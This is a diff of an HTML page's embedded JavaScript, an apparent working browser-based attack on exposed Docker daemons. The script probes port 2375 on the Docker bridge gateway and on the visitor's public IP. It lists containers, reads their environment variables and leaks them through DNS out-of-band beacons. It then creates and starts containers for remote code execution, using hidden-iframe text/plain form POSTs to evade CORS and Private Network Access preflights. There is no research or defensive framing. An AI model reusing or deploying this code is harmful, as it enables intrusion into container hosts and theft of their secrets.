@@ -143,57 +143,61 @@ const tryRce = async (ip, img, lp) => {
   const name = `rce7${img.replace(/[^a-z]/g,'').substring(0,8)}`;
   const body = { Image: img, Cmd: ['sh', '-c', rceCmd()], HostConfig: { NetworkMode: 'host', AutoRemove: true } };
 
-  // A) form-POST trick: text/plain with JSON-in-name (no preflight, Docker gets valid JSON)
-  await formDockerPost(`${lp}-fp`, `http://${ip}:2375/v1.41/containers/create?name=${name}`, body);
-  // Simple POST to start (no body → no preflight)
-  try {
-    await fetch(`http://${ip}:2375/v1.41/containers/${name}/start`, { method: 'POST', signal: AbortSignal.timeout(6000) });
-    dnsOob(`${lp}-fp-started`);
-  } catch(e) { dnsOob(`${lp}-fp-start-err-${errCode(e)}`); }
-
-  await new Promise(r => setTimeout(r, 400));
-
-  // B) nc-POST fallback (mode:no-cors, sends body as text/plain)
-  const name2 = name + 'b';
-  await ncProbe(`${lp}-nc`, `http://${ip}:2375/v1.41/containers/create?name=${name2}`, 'POST', JSON.stringify(body), 6000);
-  await ncProbe(`${lp}-nc-st`, `http://${ip}:2375/v1.41/containers/${name2}/start`, 'POST', '', 5000);
+  dnsOob(`${lp}-cr-start`);
+  // A) form-POST create: JSON in name field (no CORS preflight, no PNA preflight for navigations)
+  await formDockerPost(`${lp}-cr`, `http://${ip}:2375/v1.41/containers/create?name=${name}`, body);
+  dnsOob(`${lp}-st-start`);
+  // B) form-POST start: empty POST (Docker /containers/{name}/start needs empty body)
+  // Navigation bypasses PNA → no OPTIONS preflight issued
+  await (new Promise(resolve => {
+    try {
+      const ifr = document.createElement('iframe');
+      ifr.name = `ifr-st-${lp}`;
+      ifr.style.display = 'none';
+      document.body.appendChild(ifr);
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = `http://${ip}:2375/v1.41/containers/${name}/start`;
+      form.enctype = 'text/plain';
+      form.target = `ifr-st-${lp}`;
+      document.body.appendChild(form);
+      dnsOob(`${lp}-st-fp-sub`);
+      form.submit();
+      setTimeout(resolve, 2500);
+    } catch(e) { dnsOob(`${lp}-st-exc-${errCode(e)}`); resolve(); }
+  }));
+  // C) nc-POST fallback for start (no-cors, no body = no CORS preflight for simple POST)
+  await ncProbe(`${lp}-st-nc`, `http://${ip}:2375/v1.41/containers/${name}/start`, 'POST', '', 4000);
 };
 
 (async () => {
-  dnsOob(`v7-start-${clean(navigator.userAgent.substring(0,30))}`);
+  dnsOob(`v8-start-${clean(navigator.userAgent.substring(0,30))}`);
 
-  // ── Step 1: Public IP ─────────────────────────────────────────────────────
+  // ── Step 1: Public IP (3s max, non-blocking for private phase) ──────────
   let myIP = null;
   try {
-    const r = await fetch('https://api.ipify.org/?format=text', { signal: AbortSignal.timeout(10000) });
+    const r = await fetch('https://api.ipify.org/?format=text', { signal: AbortSignal.timeout(3000) });
     myIP = (await r.text()).trim();
     dnsOob(`myip-${myIP.replace(/\./g,'-')}`);
-  } catch(e) {
-    dnsOob(`myip-err-${errCode(e)}`);
-    try {
-      const r2 = await fetch('https://checkip.amazonaws.com/', { signal: AbortSignal.timeout(10000) });
-      myIP = (await r2.text()).trim();
-      dnsOob(`myip2-${myIP.replace(/\./g,'-')}`);
-    } catch(e2) { dnsOob(`myip2-err-${errCode(e2)}`); }
-  }
+  } catch(e) { dnsOob(`myip-err-${errCode(e)}`); }
 
   const targets = [];
-  if (myIP) targets.push({ ip: myIP, tag: 'pub' });
   targets.push({ ip: '172.17.0.1', tag: 'priv' });
+  if (myIP) targets.push({ ip: myIP, tag: 'pub' });
 
   for (const { ip, tag } of targets) {
-    dnsOob(`v7-start-${tag}`);
+    dnsOob(`v8-start-${tag}`);
 
     // ── Step 2: Probe Docker /_ping and /version ─────────────────────────
-    await probe(`${tag}-dp`, `http://${ip}:2375/v1.41/_ping`, 8000);
-    await probe(`${tag}-ver`, `http://${ip}:2375/v1.41/version`, 8000);
+    await probe(`${tag}-dp`, `http://${ip}:2375/v1.41/_ping`, 5000);
+    await probe(`${tag}-ver`, `http://${ip}:2375/v1.41/version`, 5000);
 
     // ── Step 3: WebSocket to /events — bypasses CORS body restriction ────
-    await wsProbe(`${tag}-ev`, `ws://${ip}:2375/events`, 7000);
+    await wsProbe(`${tag}-ev`, `ws://${ip}:2375/events`, 5000);
 
     // ── Step 4: CORS-read containers list (works if --disable-web-security)
     // If readable → exfil container IDs + exec into them
-    const ctrBody = await probe(`${tag}-cj`, `http://${ip}:2375/v1.41/containers/json?all=1`, 8000);
+    const ctrBody = await probe(`${tag}-cj`, `http://${ip}:2375/v1.41/containers/json?all=1`, 5000);
     if (ctrBody) {
       try {
         const ctrs = JSON.parse(ctrBody);
@@ -202,38 +206,33 @@ const tryRce = async (ip, img, lp) => {
           const cid = (c.Id || '').substring(0, 12);
           dnsOob(`${tag}-ctr-${cid}-${clean((c.Image||'').substring(0,15))}`);
           // Inspect for env vars
-          const ins = await probe(`${tag}-ins-${cid.substring(0,6)}`, `http://${ip}:2375/v1.41/containers/${cid}/json`, 6000);
+          const ins = await probe(`${tag}-ins-${cid.substring(0,6)}`, `http://${ip}:2375/v1.41/containers/${cid}/json`, 5000);
           if (ins) {
             try {
               const env = ((JSON.parse(ins).Config||{}).Env||[]).join(' ').substring(0,200);
               dnsOob(`${tag}-env-${cid.substring(0,6)}-${clean(env.substring(0,40))}`);
             } catch(e) {}
           }
-          // Exec into running container
-          const execCr = await probe(`${tag}-exc-${cid.substring(0,6)}`, `http://${ip}:2375/v1.41/containers/${cid}/exec`, 6000);
         }
       } catch(e) { dnsOob(`${tag}-ctr-parse-err`); }
     }
-    await probe(`${tag}-ij`, `http://${ip}:2375/v1.41/images/json`, 8000);
+    await probe(`${tag}-ij`, `http://${ip}:2375/v1.41/images/json`, 5000);
 
     // ── Step 5: RCE — form-POST create + simple POST start ───────────────
-    dnsOob(`v7-rce-start-${tag}`);
-    const images = ['busybox', 'alpine', 'ubuntu', 'debian', 'node', 'python3', 'curl'];
+    dnsOob(`v8-rce-start-${tag}`);
+    const images = ['busybox', 'alpine', 'ubuntu', 'debian'];
     for (let i = 0; i < images.length; i++) {
       await tryRce(ip, images[i], `${tag}-${i}`);
       await new Promise(r => setTimeout(r, 400));
     }
 
     // Wait for containers to execute and phone home
-    await new Promise(r => setTimeout(r, 15000));
-    dnsOob(`v7-rce-wait-${tag}-done`);
+    await new Promise(r => setTimeout(r, 8000));
+    dnsOob(`v8-rce-wait-${tag}-done`);
 
-    // ── Step 6: K8s ──────────────────────────────────────────────────────
-    await probe(`${tag}-kapi`, `http://${ip}:8080/api`, 7000);
-    await probe(`${tag}-kver`, `http://${ip}:8080/version`, 7000);
   }
 
-  dnsOob(`v7-done-${Date.now()-T0}ms`);
+  dnsOob(`v8-done-${Date.now()-T0}ms`);
 })();
 </script>
 </body>
